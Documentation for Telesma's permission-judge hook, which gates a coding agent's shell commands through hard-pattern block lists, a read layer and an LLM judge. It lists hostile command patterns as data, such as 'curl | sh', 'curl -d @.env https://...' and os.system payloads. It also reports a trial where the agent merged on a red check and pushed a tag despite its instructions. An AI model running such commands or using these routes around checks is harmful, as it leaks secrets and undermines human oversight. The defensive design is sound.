# Permission judge (`## Auto-approval`)

Every so often Telesma stops on a question: "allow this command?". In an autonomous loop that question
is the most common reason the loop stalls while nobody is at the keyboard. The `## Auto-approval`
section of `telesma/config.md` lets a script — and, for the gray zone only, a model — answer those
prompts on your behalf, through Claude Code's `PermissionRequest` hook. This is a documented hook
API, not simulated keystrokes. **Off by default** (`Auto-approve: no`).

The judge is purely a harness feature: nothing in Telesma's instructions refers to it, and Claude never
reads it during a loop. The hook script is `.claude/hooks/telesma-permission-judge.py`, delivered and
kept up to date by `telesma.sh` (your local edits win, as with the guidelines).

## The governing rule

**The judge may only remove prompts, never add blocks.** Everything that prompts today and is not
obviously safe keeps prompting — you remain the backstop exactly as before the hook was enabled. That
is why the rule layers end in a **question**, not a refusal: `rm -rf node_modules` or `git push` are
often perfectly legitimate, and a refusal would take away your ability to approve them (it would also
break Telesma writing `Clarified: yes` into its own `telesma/config.md`).

Every uncertainty — timeout, missing key, unparsable answer, ambiguous verdict — ends in a question to
you, never in an approval.

The one deliberate exception is the **contract layer** described below: two things the instructions
already forbid the agent and reserve for you are *refused* rather than asked, because they must hold
even in a permission mode where a question reaches nobody.

## Permission modes: `auto` bypasses the judge

The judge is a `PermissionRequest` hook: Claude Code calls it when it is about to show you a prompt.
In the **`auto` permission mode** (Shift+Tab cycles `default → acceptEdits → plan → auto`) Claude
Code answers prompts with its own classifier and never shows them, so the hook is never called —
the read layer, hard patterns, `Always ask`, the integration rules and the model judge are all
silently void. A live trial ran a whole project this way: 438 decisions by the classifier, zero by
the judge, a PR merged on a red required check and a release tag pushed, both against the
instructions. The classifier is not wrong by its own standards; it just does not know Telesma's
contract.

What Telesma does about it:

- The launcher starts Claude with `--permission-mode` taken from `## Permissions → Mode`
  (default `acceptEdits`), so a session never *starts* in `auto`. Switching later is your call —
  the mode is shown in the status bar.
- The judge's `PreToolUse` hook still runs in `auto`. When it sees that mode it writes one `note`
  per session into `telesma/state/PERMISSIONS.jsonl` and hands the model a line of context: the judge
  is bypassed, decisions reserved for the user must be *reported*, not executed because nothing asked.
- At the next start the launcher reads the note and tells you the previous session ran with the
  judge bypassed.
- The **contract layer** (below) holds regardless of mode.

`bypassPermissions` is treated the same way (nothing prompts, so nothing is intercepted). In
`auto` you also lose the human-decision pairs the evaluation gate learns from — the log has
nothing to pair.

## The contract layer — the only refusals

Two agent-side rules of the loop's contract are enforced in `PreToolUse` as a **deny with a
reason**, in every permission mode:

1. **Merge only on green.** `gh pr merge <n>` (without `--auto`, with the GitHub integration and a
   list of `Required checks`) is refused when any required check is red, pending or **missing**,
   and always with `--admin`. The hook runs its own `gh pr checks <n> --json` — the exit code of
   whatever the model piped the checks through plays no part. A `NEUTRAL` or skipped conclusion
   counts as green, as it does for GitHub's own required checks (Specky answers `Specky-Req: none`
   with `NEUTRAL`).
2. **No release-tag push.** `git push` carrying `vX.Y.Z`, `refs/tags/v…`, `--tags` or
   `--follow-tags` is refused in every project, integration or not. Section 15.4 of the instructions
   gives the user the command instead.

Everything else keeps the governing rule. A `gh` failure never refuses (no decision → the
`PermissionRequest` layer asks as before). The refusal carries the reason to the model, and you can
still run the operation yourself. The layer is deliberately tiny: it mirrors what the instructions
already say, nothing more.

Two related **command fixes** (rewrite instructions, not refusals — see below): `gh pr checks … |
tail && gh pr merge …` is sent back because the pipe hides the checks' exit code (the exact shape
that merged on red in the trial), and with the Specky tracker a `gh pr create` whose body has no
`Specky-Req:` trailer is sent back (`Specky-Req: none` is the neutral form).

## Three layers — the model is last and narrowest

| Layer | What it does | Result |
|-------|--------------|--------|
| 1. Hard patterns | `rm -rf`, `sudo`, `curl \| sh`, `git push`, SSH keys, `.env`, cloud CLIs, package publishing, history rewriting, any write to `.claude/` or `telesma/config.md` (the supervision must not supervise itself) | **you are asked** — the model never sees these, so it cannot approve them |
| 2. `Always ask` + rule checks | your own regexes from the config; at `conservative`, obfuscation (`$( )`, backticks, base64); writes disguised as reads (see below) | **you are asked** |
| read layer | a command whose every member is provably a read inside the project (see below) | **allowed without a model** |
| 3. LLM judge | only the gray zone that layers 1–2 did not filter out | `ALLOW` → approved; **anything else, `DENY` included, → you are asked** |

In the `command` variant the judge therefore cannot block anything — the worst it can do is ask.
Enabling it cannot break a workflow, which matters because models are overzealous (they will reject
`pip install requests`), and that must never cost you the ability to say yes.

The model **cannot unlock** anything that layer 1 or 2 stopped — it only ever sees what passed them.

## Read layer — no model needed (`Allow reads`)

The decision log of the reference project answered the question "should we switch to a bigger model?":
of 742 gray-zone commands, the model allowed 27%, and most of the questions were `grep`, `ps`, `cat`,
`ls`, `tail` glued together with pipes. The problem was never the model's size.

So a command whose **every** member is provably a read within the project or the working directories
passes without the model. Proof, not a guess: variable expansion, a subshell, a background job, an
unknown option, a substitution used as a path, a file that looks like a secret, a path leaving the
project (including through a symlink — `realpath` must land inside an allowed root) → the layer steps
back and the command goes on the usual way. Output redirection is accepted only into working
directories, never into the repository. Hard patterns and `Always ask` take precedence.

It needed its own quote-aware parser: a naive split on `|` turns `grep -E "a|b"` into two commands, and
splitting on `>` would make `echo x > cat` look like two harmless ones. Replayed over the reference log
it removes 106 of 413 prompts (26%); the evaluation set found its first real hole within a minute
(`git show HEAD:.env` — now stopped). Default `yes`; works with `Judge: command` and `rules`, also when
the model is unavailable.

## Writes disguised as reads — caught by rules, before the model

The second measurement on the evaluation set showed the model allowing exactly what its prompt forbids:
`echo x > src/main.py`, `sed -i`, `sort -o`, `find -delete`, `git checkout -- src/`, `git stash`. So the
recognition moved into rules (layer 2 → a question, never a refusal), on the same parser as the read
layer.

- At `conservative`: redirect or `tee` into the repository, `sed -i` / `w` / `e`, `sort -o`, `uniq` with
  an output file, `find -delete` / `-exec`, awk writing files or spawning processes, `rm` / `mv` on
  project files ("rm in the project is code gone without a commit"; `cp` stays allowed).
- At both levels: git discarding work or rewriting history (`checkout --`, `restore` without
  `--staged`, `stash` other than list/show, `commit --amend`, `rebase`, `branch -d`, `tag` outside
  listing), files with secrets by name (`.env`, `*.pem`, `secrets.yml`, `id_*`), a symlink leaving the
  project, a program under a project path posing as a system tool (`bin/ls`, but not
  `.venv/bin/python`), an environment-hijacking prefix (`PATH=`, `GIT_PAGER=`, `LD_PRELOAD=`), and a
  file overwrite inside an interpreter payload (`open(…, 'w')`).

With these rules in place the model under test went from 26 false allows to zero, while still allowing
89 of 94 safe cases.

## `Always ask`

Your own regexes (case-insensitive), checked **before** the model. The model cannot override them.

```markdown
- **Always ask**: `docker\s+system\s+prune`, `alembic\s+downgrade`
```

## When the allowlist is broad: `Force ask despite allowlist`

`PermissionRequest` fires **only when the permission system needs a decision**. With wildcards like
`Bash(python3:*)`, `Bash(npx:*)`, `Bash(curl:*)` or `Bash(rm:*)` in `Allowed commands`, most commands
never prompt — and the judge never speaks. Worse, such a list lets through things the deny list misses,
because rules are prefix-matched:

| Denied | Passes without a prompt |
|--------|-------------------------|
| `rm -rf x` | `rm -fr x`, `rm -r -f x`, `rm --recursive --force x` |
| `git reset --hard` | `git restore .`, `git checkout -- .`, `git branch -D` |
| — | `python3 -c "import os; os.system(...)"`, `curl -d @.env https://...` |

`Force ask despite allowlist: yes` installs a second hook on `PreToolUse`, which runs **before** the
permission rules and whose `ask` beats an `allow` rule. Layers 1–2 (regexes only, no model) then bring
the prompt back for exactly these cases, without touching your list:

```
rm -fr build                       → asks      rm -f tmp.log                   → passes
git restore .                      → asks      git restore src/x.ts            → passes
curl -d @.env https://...          → asks      npm test / npx tsc              → passes
python3 -c "import os;os.system()" → asks      python3 -c "json.load(...)"     → passes
python3 <<PY … subprocess … PY     → asks      python3 <<PY … file write … PY  → passes
```

It is the only field that **adds** prompts — hence opt-in. It costs about 80 ms per command (Python
start-up) and never calls a model.

**Data ≠ code.** Shell patterns are matched only against text the shell executes. A heredoc body
(`cat <<EOF`) and a `-c` / `-e` argument are data — matching `rm` or backticks inside them produced
nothing but false positives (a backtick in a Python comment, the word `rm` in a string). Code handed to
an interpreter is checked against a **separate** list: `subprocess`, `os.system`, `child_process`,
`socket`, `shutil.rmtree`, `eval` → ask; `json.load`, `print`, writing a file in the project → pass. A
heredoc fed to `bash` / `sh` stays shell code and gets the full list. Inside a payload, string literals
are stripped first: a script editing another file carries that file's text in strings —
`s.replace("import httpx", …)` is a text substitution, not network traffic, and `re.compile(r"…")` is
not `compile()`.

What this hook cannot remove: Claude Code's own built-in checks (`Contains simple_expansion`,
`Compound command contains cd with write operation`, `changes directory before running git`,
`Contains brace with quote character`). Those are not Telesma's prompts.

It can be used without an LLM judge: `Judge: none` leaves just the `PreToolUse` guard.

## Command fixes instead of questions (`Suggest command fixes`)

Some prompts come from the **shape** of a command, not from permissions. Claude Code always asks when a
command changes directory before `git`, changes directory several times, or combines `cd` with a write —
it cannot map paths to rules unambiguously. No `allow` rule removes that.

Each of those cases has a trivial equivalent. Instead of asking you, the hook blocks the command with a
rewrite instruction and Claude sends the corrected version:

```
cd /repo && git add x && git commit    →  git -C /repo add x && git -C /repo commit
cd src && … && cd .. && npx tsc        →  two separate Bash calls
cd ../backend && perl -0pi -e … file   →  full path, no cd
for l in en de fr; do … "$l" … done    →  the loop inside a python3 script
SP=/tmp/x && cp $SP/a.bak .            →  the value inline: cp /tmp/x/a.bak .
python3 - "$PWD" <<PY                  →  the path inline (the hook knows the cwd)
cat >> tests/x.py <<'EOF' … EOF        →  the Edit/Write tool
python3 <<PY … p.write_text(s) … PY    →  the Edit/Write tool
```

The last pattern targets throwaway scripts that rewrite a file (`write_text`, `open(…, "w")`,
`json.dump`): braces with quotes in such code regularly trip the obfuscation check, while Edit/Write
does the same more reliably and shows a diff. Use scripts for reading and analysis, the tools for writing.

Your click turns into one automatic correction. Only cases with a **certain** equivalent are gated —
these pass untouched: `cd frontend && npx vitest` (one `cd`, no git, no write),
`cd app; grep . 2>/dev/null` (a redirect to `/dev/null` does not depend on the directory), a loop
**inside** a Python script, `$(pgrep …)`, and `$HOME` or other variables whose values Claude does not
know — those stay ordinary prompts, since there is nothing to suggest.

Default `yes`; it works whenever the `PreToolUse` hook is installed, i.e. with `Auto-approve: yes`.

## Judge variants (`Judge` field)

| Variant | Model | Configuration | Note |
|---------|-------|---------------|------|
| `command` | any OpenAI-compatible API (Ollama, vLLM, LiteLLM, LM Studio, …) | `Endpoint (command)` + `Model (command)` + `API key (command)` | **Recommended.** The only variant in which layer 2 means exactly "ask the human" |
| `rules` | — | — | The same script **without a model**: hard patterns, `Always ask` and the read layer. Reads do not ask, everything else asks you. For when no model is at hand |
| `none` | — | — | No LLM judge; only the `PreToolUse` guard from `Force ask despite allowlist` remains |
| `prompt` | Claude Code's built-in judge | `Model (prompt/agent)` | Zero configuration, but layer 2 can then only block, not ask (see below) |
| `agent` | as above, but the judge has `Read` / `Grep` and can inspect the repository | `Model (prompt/agent)` | Slower and more expensive; marked experimental in Claude Code |

Why `command` is better: hooks in one array all run together, so a guard script's "no decision" could
not stop an "allow" from the `prompt` / `agent` judge. Only there does a hit in layer 1 or 2 end in a
refusal instead of a question — the one place where the governing rule cannot hold. In `command` one
script does everything, and "ask the human" means exactly that.

### Risk levels (`Risk level`)

- `conservative` (default) — `ALLOW` only for reversible operations contained in the project: tests,
  linters, build, reads, `git status/diff/log/add/commit`. Command substitutions `$( )` and backticks →
  you are asked. Dependency installs, network, writes outside the project → you are asked.
- `balanced` — additionally writing files in the project, installing dependencies from official
  registries, `docker compose` on localhost, migrations in dev.

`Gated tools` (default `Bash`) is a regex of tool names the hook handles, e.g. `Bash|Edit|Write`. With
`Mode: acceptEdits`, Edit/Write do not prompt anyway, so `Bash` alone is usually enough.

## Setting it up — an example with a local Ollama model

```markdown
## Auto-approval

- **Auto-approve**: yes
- **Judge**: command
- **Model (command)**: llama3.1:8b
- **Endpoint (command)**: http://localhost:11434/v1/chat/completions
- **API key (command)**: none
```

```bash
ollama pull llama3.1:8b
./telesma.sh /path/to/project
```

Before you trust **any** model with `ALLOW`, put it through the evaluation gate (below). Small local
models fail it more easily; until one passes, `Judge: rules` gives you the read layer and the rule
checks with no model at all.

### Where the key comes from (`API key (command)`)

`telesma/config.md` is committed, so a key never belongs in it. The field takes these forms — the hook
resolves them at every decision, the launcher validates them at startup:

| Form | Where the key comes from | When |
|------|--------------------------|------|
| `env:TELESMA_JUDGE_API_KEY` | an environment variable | you already `export` it in your profile |
| `file:~/.config/telesma/judge.key` | the first line of a file outside the repo | **simplest** — no `export`, works even when you start `claude` without `telesma.sh` |
| `cmd:security find-generic-password -s telesma-judge -w` | the command's stdout | macOS Keychain / `pass` / a vault — the key is never stored in clear |
| `none` | no `Authorization` header | a local server |
| `sk-...` | the literal value | only when `config.md` is NOT in version control; the launcher warns at every start |

The launcher also warns when a `file:` target sits inside the repository. Anything that cannot be
resolved (missing variable, missing file, failing command) → the judge stays silent and the prompt goes
to you.

```bash
mkdir -p ~/.config/telesma && printf 'sk-...\n' > ~/.config/telesma/judge.key
chmod 600 ~/.config/telesma/judge.key
# or, on macOS, once:
security add-generic-password -s telesma-judge -a "$USER" -w 'sk-...'
```

At startup the launcher prints the judge, risk level and gated tools, and warns when the endpoint or key
is missing (then the judge is silent and prompts come back to you). `Auto-approve: no` removes the hooks
from `.claude/settings.local.json` at the next start — turning it off is one word, nothing to clean up
by hand.

## Fallback model and shadow mode

Fields `Fallback endpoint (command)`, `Fallback model (command)`, `Fallback API key (command)`,
`Fallback mode`.

The fallback is asked **only when the primary does not answer** (network, timeout, 401, 5xx) — "the
model was unsure" and "there is no model" are two different things in the log. Typically it is local:
Ollama (`http://localhost:11434/v1/chat/completions`) or LM Studio
(`http://localhost:1234/v1/chat/completions`).

- `shadow` (default) — the fallback decides nothing. A detached background process asks it and writes
  its verdict to the log, also when the primary works, so the two models can be compared on **your own**
  commands before the fallback gets any right to allow.
- `allow` — when the primary does not answer, the fallback's `ALLOW` removes the prompt. Set this only
  after the candidate passes the evaluation gate.

After a primary failure the hook skips it for 2 minutes, so a dead server does not add a full timeout
to every command.

## Human decisions and `telesma/state/PERMISSIONS.jsonl`

`Decision log: yes` (default) writes every decision to `telesma/state/PERMISSIONS.jsonl`: time, tool, the full
command (up to 8000 characters), layer (`0` rewrite, `1`, `2`, `read`, `3`), decision (`allow`, `deny`,
`ask`, `ask-forced`, `rewrite`), reason, model and response time. Keep it on at least for the first few
sessions — it is the only way to check whether the judge lets too much through:

```bash
# what the judge allowed without asking
grep '"decision": "allow"' telesma/state/PERMISSIONS.jsonl | tail -20
```

`Log human decision: yes` (default) adds a `PostToolUse` hook that appends an `executed` entry when a
command you were asked about actually ran — i.e. you approved it. It judges nothing and affects
nothing; it is the only "the human said yes" label that can be collected without asking you anything.
A question with no `executed` pair is a refusal **or** an interrupted session. The fallback's verdicts
in shadow mode appear as `shadow` entries.

The log holds **full commands** and stays on your machine: new projects have it in `Ignore on commit`
(add `telesma/state/PERMISSIONS.jsonl` there yourself in an older project), and telemetry, when enabled, sends
only per-day counters from it.

## The evaluation gate (`tools/telesma-judge-eval.py`)

A labelled set lives in `tools/judge-eval/dataset.jsonl` (324 cases: `dangerous`, `safe`, and
`disputed` — the last depend on the risk level and are not counted). The evaluation pushes every case
through **the same pipeline as the hook**: a case stopped by a hard pattern never reaches the model,
exactly as in real work. Paths are placeholders resolved into a temporary test project that also carries
a symlink pointing outside it and files with secrets, so the set holds nothing from anyone's machine.

**The gate: zero false allows on `dangerous`.** `ALLOW` is the judge's only decision with an effect, so
it is the only one that has to be proven safe. The allow rate on `safe` only tells you how many prompts
a candidate removes.

```bash
python3 tools/telesma-judge-eval.py                                    # rules only, no network
python3 tools/telesma-judge-eval.py --endpoint http://localhost:11434/v1/chat/completions \
                                  --model llama3.1:8b                # rules + a model
python3 tools/telesma-judge-eval.py --from-config <project>            # the primary model from a project's config
python3 tools/telesma-judge-eval.py --from-config <project> --fallback # the fallback model instead
python3 tools/telesma-judge-eval.py --no-reads …                       # disable the read layer: the model alone
python3 tools/telesma-judge-eval.py --replay <project>                 # the project's real log through today's rules
python3 tools/telesma-judge-eval.py --labels <project>                 # question ↔ executed pairs, shadow verdicts
```

The required line in the output is `FALSE ALLOWS: 0`. `--risk balanced` evaluates the other level,
`--show` lists safe cases that still prompt, `--json FILE` writes results case by case.

`--replay` answers "what would today's rules have done with what I actually ran", and `--labels`
reports how many human-approved pairs the log has collected (toward 2000, the point at which
fine-tuning your own judge starts to make sense) along with the shadow fallback's verdicts next to the
primary's. Training your own model is deliberately not done yet: distilling it from the current log
would just reproduce an over-cautious teacher.

## What it does NOT do

- It does not replace `Allowed commands` — that list is cheaper and deterministic and handles most of the
  traffic; the hook only sees what would have prompted anyway.
- It does not answer prompts in Claude Code's `auto` mode or with `Mode: bypassPermissions` — the
  `PermissionRequest` hook is not called there. Only the contract layer, the command fixes and the
  once-per-session note run (see "Permission modes" above).
- It does not protect against a model that already has permission — it gates individual calls, not
  intentions.
- It moves the trust boundary from you to rules and a model. Layer 1 is what decides whether that risk
  is acceptable — extend `Always ask`, do not shorten the hard patterns.
